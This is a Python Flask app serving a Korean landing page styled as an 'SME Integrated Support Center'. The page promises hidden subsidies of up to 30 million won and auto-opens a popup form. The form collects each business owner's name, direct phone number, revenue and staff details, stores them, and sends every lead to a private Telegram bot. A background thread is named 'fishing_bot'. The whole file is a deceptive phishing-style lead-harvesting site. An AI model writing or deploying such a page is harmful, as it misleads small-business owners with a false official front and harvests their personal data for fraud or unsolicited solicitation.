import os
import requests
import threading
import time
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime

app = Flask(__name__)
basedir = os.path.abspath(os.path.dirname(__file__))

# DB 설정
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os.path.join(basedir, 'SME_MASTER_FINAL.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# Telegram 설정
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")

# DB 모델
class BusinessLead(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    biz_name = db.Column(db.String(100))
    owner_name = db.Column(db.String(50))
    phone = db.Column(db.String(20), unique=True)
    revenue = db.Column(db.String(20))
    employees = db.Column(db.String(20))
    youth_support = db.Column(db.String(10))
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

with app.app_context():
    db.create_all()

# 팝업 반복/스케줄 스레드
def fishing_bot():
    while True:
        time.sleep(3600)  # 1시간마다 반복 (필요시 확장)

# HTML + JS (팝업 포함)
HTML_PAGE = r"""
<!DOCTYPE html>
<html lang="ko">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SME 통합지원센터</title>
<style>
body{background:#0f172a;color:white;font-family:sans-serif;margin:0;padding:0}
h2{text-align:center;margin-top:80px;color:#fbbf24}
p{text-align:center;margin-bottom:30px}
.card{background:#1e293b;padding:25px;border-radius:20px;width:90%;max-width:420px;margin:auto;margin-top:50px}
input, select{width:100%;padding:12px;margin:8px 0;background:#0f172a;border:1px solid #334155;color:white;border-radius:10px}
button{background:#fbbf24;padding:15px;width:100%;font-weight:bold;border:none;border-radius:12px;font-size:16px;cursor:pointer}
.btn-phone{display:block;background:#22c55e;padding:15px;margin-top:10px;text-align:center;border-radius:10px;color:white;font-weight:bold;text-decoration:none}
#popup{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85)}
</style>
</head>
<body>

<h2>🔥 숨은 지원금 최대 3,000만원 확인</h2>
<p>1분만에 내 회사 환급금 조회</p>
<div style="text-align:center"><button onclick="openPopup()">내 지원금 확인하기</button></div>

<div id="popup">
<div class="card">
<h3>SME 통합지원센터</h3>
<input id="biz" placeholder="기업명(법인/개인)">
<input id="owner" placeholder="대표자 성함">
<input id="phone" placeholder="대표자 직통번호(숫자만)">
<input id="revenue" placeholder="직전연도 대략 매출액(예: 20억)">
<select id="employees">
    <option value="">직원 수 선택</option>
    <option value="5인미만">5인 미만</option>
    <option value="30인미만">30인 미만</option>
    <option value="30인이상">30인 이상</option>
</select>
<select id="youth_support">
    <option value="">청년지원금 해당 여부</option>
    <option value="예">예</option>
    <option value="아니오">아니오</option>
</select>

<button onclick="submitLead()">무료 분석 신청</button>
<a href="tel:01098091609" class="btn-phone">📞 바로 상담하기</a>
<button onclick="closePopup()" style="margin-top:10px;background:#334155;width:100%;padding:12px;border:none;border-radius:10px;">닫기</button>
</div>
</div>

<script>
window.onload=function(){setTimeout(()=>openPopup(),1000)}
function openPopup(){document.getElementById('popup').style.display='block'}
function closePopup(){document.getElementById('popup').style.display='none'}

async function submitLead(){
    const data={
        biz: document.getElementById('biz').value,
        owner: document.getElementById('owner').value,
        phone: document.getElementById('phone').value,
        revenue: document.getElementById('revenue').value,
        employees: document.getElementById('employees').value,
        youth_support: document.getElementById('youth_support').value
    }
    const res = await fetch('/api/v1/submit',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify(data)
    })
    if(res.ok){alert("신청 완료!"); closePopup()}
    else{alert("오류 발생!")}
}
</script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_PAGE)

@app.route('/api/v1/submit', methods=['POST'])
def submit():
    data = request.json

    new = BusinessLead(
        biz_name=data.get('biz'),
        owner_name=data.get('owner'),
        phone=data.get('phone'),
        revenue=data.get('revenue'),
        employees=data.get('employees'),
        youth_support=data.get('youth_support')
    )
    try:
        db.session.add(new)
        db.session.commit()
    except Exception as e:
        db.session.rollback()
        return jsonify({"ok": False, "error": str(e)})

    # Telegram 알림 (실패해도 앱은 계속 실행)
    if TELEGRAM_TOKEN and CHAT_ID:
        try:
            msg = f"🚨 신규 DB\n기업명: {data.get('biz')}\n전화: {data.get('phone')}\n매출: {data.get('revenue')}\n직원: {data.get('employees')}\n청년지원금: {data.get('youth_support')}"
            requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                          json={"chat_id": CHAT_ID, "text": msg})
        except:
            pass

    return jsonify({"ok": True})

if __name__ == '__main__':
    threading.Thread(target=fishing_bot, daemon=True).start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
